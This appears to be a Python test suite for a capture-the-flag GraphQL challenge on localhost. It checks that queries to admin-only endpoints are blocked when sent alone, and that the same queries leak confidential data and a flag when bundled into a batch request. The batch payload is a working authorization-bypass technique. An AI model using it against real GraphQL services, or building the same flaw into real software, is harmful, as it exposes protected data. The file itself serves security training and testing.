#!/usr/bin/env python3
"""
Batch Query Authorization Bypass Challenge Tests
Tests for batch query authorization bypass vulnerability in GraphQL
"""

import requests
import json
import sys
import time
import subprocess
import os
from urllib.parse import urljoin


class TestBatchQueryAuthBypassChallenge:
    """Test suite for Batch Query Authorization Bypass Challenge"""
    
    def __init__(self, base_url="http://localhost:8006"):
        self.base_url = base_url
        self.graphql_url = urljoin(base_url, "/graphql")
        self.health_url = urljoin(base_url, "/health")
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Batch-Auth-Bypass-Test/1.0'
        })
        self.tests_passed = 0
        self.tests_failed = 0
    
    def start_services(self):
        """Start Docker Compose services"""
        print("🚀 Starting Batch Query Authorization Bypass Challenge...")
        try:
            # Change to challenge directory
            os.chdir('../06-batch-query-auth-bypass')
            subprocess.run(['docker-compose', '-f', 'docker-compose-dev.yml', 'up', '-d'], 
                         check=True, capture_output=True)
            return True
        except subprocess.CalledProcessError as e:
            print(f"❌ Failed to start services: {e}")
            return False
        finally:
            # Change back to tests directory
            os.chdir('../tests')
    
    def stop_services(self):
        """Stop Docker Compose services"""
        print("🧹 Cleaning up...")
        try:
            # Change to challenge directory
            os.chdir('../06-batch-query-auth-bypass')
            subprocess.run(['docker-compose', '-f', 'docker-compose-dev.yml', 'down'], 
                         check=True, capture_output=True)
        except subprocess.CalledProcessError as e:
            print(f"⚠️ Warning: Failed to stop services: {e}")
        finally:
            # Change back to tests directory
            os.chdir('../tests')
    
    def wait_for_service(self, timeout=120):
        """Wait for the service to be ready"""
        print("⏳ Waiting for services to be ready...")
        start_time = time.time()
        while time.time() - start_time < timeout:
            try:
                response = self.session.get(self.health_url)
                if response.status_code == 200:  # Health endpoint returns 200
                    print("✅ Services are ready")
                    return True
            except requests.exceptions.RequestException:
                pass
            time.sleep(2)
        
        print(f"❌ Services failed to start within {timeout}s")
        return False
    
    def graphql_query(self, query, variables=None):
        """Execute a GraphQL query"""
        payload = {"query": query}
        if variables:
            payload["variables"] = variables
        
        response = self.session.post(self.graphql_url, json=payload)
        return response
    
    def test_batch_query_functionality(self):
        """Test that batch queries work normally"""
        print("🧪 Test: Basic batch query functionality")
        
        try:
            # Test basic batch query functionality
            batch_payload = [
                {"query": "{ users { id username } }"},
                {"query": "{ user(id: 1) { id username } }"},
                {"query": "{ documents { id title } }"}
            ]
            
            response = self.session.post(self.graphql_url, json=batch_payload)
            
            # Check if all queries succeed
            if response.status_code == 200:
                data = response.json()
                successful_queries = sum(1 for item in data if item.get('data') is not None)
                
                if successful_queries == 3:
                    print("✅ PASS - Batch queries working correctly")
                    self.tests_passed += 1
                    return True
                    
            print("❌ FAIL - Batch query functionality failed")
            print(f"Response: {response.text}")
            self.tests_failed += 1
            return False
                
        except Exception as e:
            print(f"❌ FAIL - Exception occurred: {e}")
            self.tests_failed += 1
            return False
    
    def test_admin_endpoint_access(self):
        """Test admin endpoint access via batch query"""
        print("🧪 Test: Admin endpoint access via batch query")
        
        try:
            # Test admin query via batch query (no authorization needed)
            batch_payload = [
                {"query": "{ users { id username } }"},
                {"query": "{ adminDocuments { id title confidential debugInfo } }"}
            ]
            
            response = self.session.post(self.graphql_url, json=batch_payload)
            
            # Check if we can access confidential data and find flag
            if (response.status_code == 200 and 
                'HC{' in response.text):
                print("✅ PASS - Admin endpoint access successful via batch query (flag found)")
                self.tests_passed += 1
                return True
            else:
                print("❌ FAIL - Admin endpoint access failed or flag not found")
                print(f"Response: {response.text}")
                self.tests_failed += 1
                return False
                
        except Exception as e:
            print(f"❌ FAIL - Exception occurred: {e}")
            self.tests_failed += 1
            return False
    
    def test_individual_query_blocked(self):
        """Test that individual queries to adminDocuments are blocked"""
        print("🧪 Test: Individual query to adminDocuments blocked")
        
        try:
            # Test admin query as individual request (should be blocked)
            query = '{ adminDocuments { id title confidential debugInfo } }'
            
            response = self.session.post(self.graphql_url, json={"query": query})
            
            # Check that access is blocked due to rate limit = 0
            if (response.status_code == 200 and 
                'Rate limit reached for adminDocuments endpoint' in response.text):
                print("✅ PASS - Individual query properly blocked")
                self.tests_passed += 1
                return True
            else:
                print("❌ FAIL - Individual query not properly blocked")
                print(f"Response: {response.text}")
                self.tests_failed += 1
                return False
                
        except Exception as e:
            print(f"❌ FAIL - Exception occurred: {e}")
            self.tests_failed += 1
            return False

    def test_sensitive_endpoint_blocked_individually(self):
        """Test that sensitiveUser endpoint is blocked for individual queries"""
        print("🧪 Test: SensitiveUser individual query blocked")
        
        try:
            # Test sensitiveUser query as individual request (should be blocked)
            query = '{ sensitiveUser(id: 3) { id username documents { id title confidential debugInfo } } }'
            
            response = self.session.post(self.graphql_url, json={"query": query})
            
            # Check that access is blocked due to rate limit = 0
            if (response.status_code == 200 and 
                'Rate limit reached for sensitiveUser endpoint' in response.text):
                print("✅ PASS - SensitiveUser individual query properly blocked")
                self.tests_passed += 1
                return True
            else:
                print("❌ FAIL - SensitiveUser individual query not properly blocked")
                print(f"Response: {response.text}")
                self.tests_failed += 1
                return False
                
        except Exception as e:
            print(f"❌ FAIL - Exception occurred: {e}")
            self.tests_failed += 1
            return False
    
    def test_single_query_batch_rejected(self):
        """Test that single query batch is rejected with proper error message"""
        print("🧪 Test: Single query batch rejected")
        
        try:
            # Test single query in batch format (should be rejected)
            single_query_batch = [
                {"query": "{ adminDocuments { id title confidential debugInfo } }"}
            ]
            
            response = self.session.post(self.graphql_url, json=single_query_batch)
            
            # Check that batch is rejected with proper error message
            if (response.status_code == 400 and 
                'Batch queries must contain at least 2 queries' in response.text):
                print("✅ PASS - Single query batch properly rejected")
                self.tests_passed += 1
                return True
            else:
                print("❌ FAIL - Single query batch not properly rejected")
                print(f"Response: {response.text}")
                self.tests_failed += 1
                return False
                
        except Exception as e:
            print(f"❌ FAIL - Exception occurred: {e}")
            self.tests_failed += 1
            return False
    
    def run_tests(self):
        """Run all batch query authorization bypass tests"""
        print("🔍 Batch Query Authorization Bypass Challenge Test Runner")
        print("=========================================================")
        
        if not self.start_services():
            return False
        
        try:
            if not self.wait_for_service():
                return False
            
            print("\n🧪 Running batch query authorization bypass tests...\n")
            
            # Run tests
            self.test_batch_query_functionality()
            self.test_individual_query_blocked()
            self.test_single_query_batch_rejected()
            self.test_admin_endpoint_access()
            self.test_sensitive_endpoint_blocked_individually()
            
            print(f"\n📊 Test Results: {self.tests_passed} passed, {self.tests_failed} failed")
            
            if self.tests_failed > 0:
                print("❌ Some tests failed")
                return False
            else:
                print("✅ All tests passed!")
                return True
                
        finally:
            self.stop_services()


def main():
    """Main function"""
    tester = TestBatchQueryAuthBypassChallenge()
    success = tester.run_tests()
    
    if success:
        print("\n🎉 Batch Query Authorization Bypass Challenge tests completed successfully!")
        sys.exit(0)
    else:
        print("\n❌ Batch Query Authorization Bypass Challenge tests failed!")
        sys.exit(1)


if __name__ == "__main__":
    main()